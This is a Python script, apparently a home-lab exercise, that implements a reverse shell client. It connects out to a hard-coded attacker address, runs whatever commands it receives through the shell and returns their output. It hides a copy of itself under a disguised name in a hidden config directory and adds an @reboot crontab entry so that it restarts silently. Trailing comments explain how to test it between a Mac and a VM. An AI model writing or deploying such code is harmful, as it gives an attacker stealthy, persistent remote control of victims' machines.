# Implementing a reverse shell client that connects to the attacker's server and await for commands.
import socket
import subprocess
import time
import os
import shutil
import getpass

# Attacker's IP and port
ATTACKER_IP = "192.168.1.47"  # Replace with your main computer's IP
ATTACKER_PORT = 9999

#establishing persistence by copying the script to a hidden directory and adding it to crontab
def establish_persistence():
    username = getpass.getuser() # grab the username of the victim
    hidden_dir = f"/home/{username}/.config/.sysupdate" # builds a hidden directory path to store the script and make it sound legit by naming it sysupdate
    hidden_path = os.path.join(hidden_dir, "systemd-update.py")

    if not os.path.exists(hidden_path):
        try:
            os.makedirs(hidden_dir, exist_ok=True)
            shutil.copyfile(__file__, hidden_path)

            cron_job = f"@reboot python3 {hidden_path} &/n" # add a cron job to run the script at start up sliently in the background
            os.system(f'(crontab -l 2>/dev/null; echo \"{cron_job}\") | crontab - ')
        
        # if the script fails, it will fail sliently and not crash the program
        except Exception as e:
            pass


# Connecting to attacker and receiving commands
def connect_to_attacker():
    while True:
        try:
            # Create the client socket
            client = socket.socket()
            client.connect((ATTACKER_IP, ATTACKER_PORT))

            while True:
                # Receive command from server
                cmd = client.recv(1024).decode("utf-8")

                # Exit if 'quit' is received
                if cmd.lower() == "quit":
                    client.close()
                    break
                
                # Run the command and send output back
                if cmd:
                    try:
                        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
                    except subprocess.CalledProcessError as e:
                        output = e.output  # Get error output if command fails
                    # send output back to attacker machine
                    client.send(output.encode("utf-8") if output else b"No output\n")
        # Reconnecting if connection is lost or fails to establish connection
        except ConnectionError:
            print("Connection lost. Reconnecting in 5 seconds...")
            client.close()
            time.sleep(5)


establish_persistence()
connect_to_attacker()

#  Run Reverse Shell Between Mac & VirtualBox VM
# 1. make sure in virtual box network setting, the network adapter is set to bridged adapter and the name is en0: wifi and start the VM
# 2. Make sure your VM is running your mac local Ip address (ipconfig getifaddr en0) and In VM, run (ip a) and look for your mac IP adresss. To vertify, run ping <mac ipddress> in VM and get relpies
# 3. On your mac, run the server.py script

# 2 ways to sent the client.py file to your VM
#   a. On your mac terminal, run scp client.py <vm username>@<vm ip address>:<path to save the file> and enter the password
#   b. you can share the folder betwrn the VM and mac and run it from the shared folder
 
# 4. On your VM, run the client.py script and should see the connection established message on VM terminal
# 5. Now your Mac terminal is now a remote command shell, type any command and should see the output on VM terminal and then sent to mac terminal
# 6. to exit the connection, type quit on mac terminal and should see the connection lost message on VM terminal